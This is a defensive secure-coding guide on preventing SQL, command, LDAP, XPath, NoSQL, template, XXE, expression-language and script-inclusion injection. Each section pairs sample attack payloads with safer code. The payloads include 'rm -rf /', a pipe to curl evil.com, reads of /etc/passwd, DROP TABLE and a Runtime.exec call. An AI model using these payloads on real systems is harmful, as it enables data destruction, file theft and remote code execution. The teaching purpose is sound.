# Injection Prevention Patterns

## SQL Injection

### Attack Vectors

```typescript
// Attack examples
const id = "1' OR '1'='1"; // Boolean-based
const id = "1; DROP TABLE users--"; // Stacked queries
const id = "1' UNION SELECT password FROM users--"; // UNION-based
```

### Prevention

```typescript
// ✅ Parameterized queries (best)
db.query("SELECT * FROM users WHERE id = ?", [userId]);

// ✅ Query builders
db.select("*").from("users").where({ id: userId });

// ✅ ORM with proper escaping
User.findOne({ where: { id: userId } });

// ❌ NEVER concatenate
db.query(`SELECT * FROM users WHERE id = '${userId}'`);
```

### Second-Order SQL Injection

```typescript
// Attack: Store malicious data, later used in query
await db.query("INSERT INTO users (name) VALUES (?)", [
  "admin' --", // Stored
]);

// Later, if name is concatenated into query:
const user = await db.query("SELECT * FROM users WHERE id = 1");
const query = `SELECT * FROM orders WHERE user = '${user.name}'`;
// Results in: SELECT * FROM orders WHERE user = 'admin' --'
```

**Prevention:** Always use parameterized queries, even with "trusted" database data.

## Command Injection

### Attack Vectors

```typescript
// Attacks through shell metacharacters
const filename = "file.txt; rm -rf /";
const filename = "file.txt | curl evil.com";
const filename = "file.txt `whoami`";
const filename = "file.txt $(cat /etc/passwd)";
```

### Prevention

```typescript
// ✅ Use spawn without shell
import { spawnSync } from "child_process";

function convertFile(filename: string): Result<string, Error> {
  // Validate filename first
  if (!validateNoCommandInjection(filename)) {
    return Err(new Error("Invalid filename"));
  }

  // Use args array, NOT shell
  const result = spawnSync("convert", [filename, "-resize", "800x600", "output.png"], {
    shell: false, // Critical
  });

  return result.error ? Err(result.error) : Ok(result.stdout.toString());
}

// ❌ NEVER use shell with user input
exec(`convert ${filename} -resize 800x600 output.png`); // Vulnerable
```

## LDAP Injection

### Attack Vectors

```typescript
// Attacks through LDAP special chars
const username = "admin)(|(password=*))"; // Boolean bypass
const username = "*"; // Wildcard match
```

### Prevention

```typescript
function escapeLDAP(input: string): string {
  return input
    .replace(/\\/g, "\\5c")
    .replace(/\*/g, "\\2a")
    .replace(/\(/g, "\\28")
    .replace(/\)/g, "\\29")
    .replace(/\0/g, "\\00");
}

// Use escaped input in LDAP query
const filter = `(uid=${escapeLDAP(username)})`;
```

## XPath Injection

### Attack Vectors

```typescript
// Attack through XPath special chars
const user = "' or '1'='1";
// Query becomes: //users/user[name='' or '1'='1']
```

### Prevention

```typescript
function escapeXPath(input: string): string {
  if (input.includes("'")) {
    // Split on ' and concatenate with concat()
    const parts = input.split("'");
    return `concat('${parts.join("',\"'\",'")}')`;
  }
  return `'${input}'`;
}

// Or use parameterized XPath (if supported by library)
```

## NoSQL Injection

### Attack Vectors (MongoDB example)

```typescript
// Attack through object injection
const query = { username: req.body.username }; // If username = { $ne: null }
// Results in: { username: { $ne: null } } - matches all users
```

### Prevention

```typescript
// ✅ Validate input type
function findUser(username: unknown): Result<User, Error> {
  if (typeof username !== "string") {
    return Err(new Error("Username must be string"));
  }

  return User.findOne({ username });
}

// ✅ Use strict schema validation
const loginSchema = z.object({
  username: z.string().min(3).max(20),
  password: z.string(),
});
```

## Server-Side Template Injection (SSTI)

### Attack Vectors

```typescript
// Attack through template syntax
const name = "{{7*7}}"; // Might evaluate to 49
const name = "${7*7}"; // Might evaluate to 49
const name = "<%= 7*7 %>"; // Might evaluate to 49
```

### Prevention

```typescript
// ✅ Avoid user input in templates
// ❌ WRONG
const template = `Hello ${userInput}`;

// ✅ CORRECT: Use templating engine's escaping
const template = "Hello {{name}}"; // Handlebars escapes by default
const rendered = Handlebars.compile(template)({ name: userInput });

// ✅ Or escape manually
const escaped = escapeHTML(userInput);
```

## XML External Entity (XXE) Injection

### Attack Vectors

```xml
<!-- Attack through DOCTYPE declaration -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Prevention

```typescript
// ✅ Disable external entities
const parser = new xml2js.Parser({
  // Disable DTDs
  async: false,
  explicitArray: false,
  // Security options
  xmlns: false,
  explicitCharkey: false,
});

// Or use safe parsing libraries
import { parseXml } from "libxmljs2";
const doc = parseXml(xmlString, { noent: false, dtdload: false });
```

## Expression Language (EL) Injection

### Attack Vectors

```typescript
// Attack through EL syntax
const message = "${applicationScope}"; // Access server variables
const message = '${Runtime.getRuntime().exec("whoami")}'; // RCE
```

### Prevention

```typescript
// ✅ Avoid evaluating user input as expressions
// ✅ Use safe template libraries that don't evaluate expressions
// ✅ Sanitize input to remove ${ and #{
function sanitizeEL(input: string): string {
  return input.replace(/\$\{/g, "").replace(/#\{/g, "");
}
```

## Cross-Site Script Inclusion (XSSI)

### Attack Vector

```html
<!-- Attacker site includes your JSON endpoint as script -->
<script src="https://yoursite.com/api/user/profile"></script>
<!-- If response is valid JavaScript, attacker can read it -->
```

### Prevention

```typescript
// ✅ Prefix JSON responses
function sendJSON(res: Response, data: object) {
  res.setHeader("Content-Type", "application/json");
  res.setHeader("X-Content-Type-Options", "nosniff");
  // Prevent parsing as JavaScript
  res.send(`)]}',\n${JSON.stringify(data)}`);
}

// ✅ Check Content-Type header
if (req.headers["content-type"] !== "application/json") {
  return res.status(400).send("Invalid Content-Type");
}
```
